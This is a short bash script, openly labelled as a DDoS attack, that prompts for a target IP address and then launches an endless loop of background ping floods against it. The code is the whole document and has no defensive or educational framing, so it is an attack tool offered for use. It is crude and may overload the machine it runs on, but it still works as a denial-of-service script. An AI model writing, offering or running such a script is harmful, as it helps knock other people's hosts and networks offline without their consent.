#!/bin/bash

# Prompt the user to enter the target IP address
echo "Enter the target IP address:"
read target_ip

# Start the DDoS attack using ping flood
while true; do
    ping -c 100 $target_ip &
done
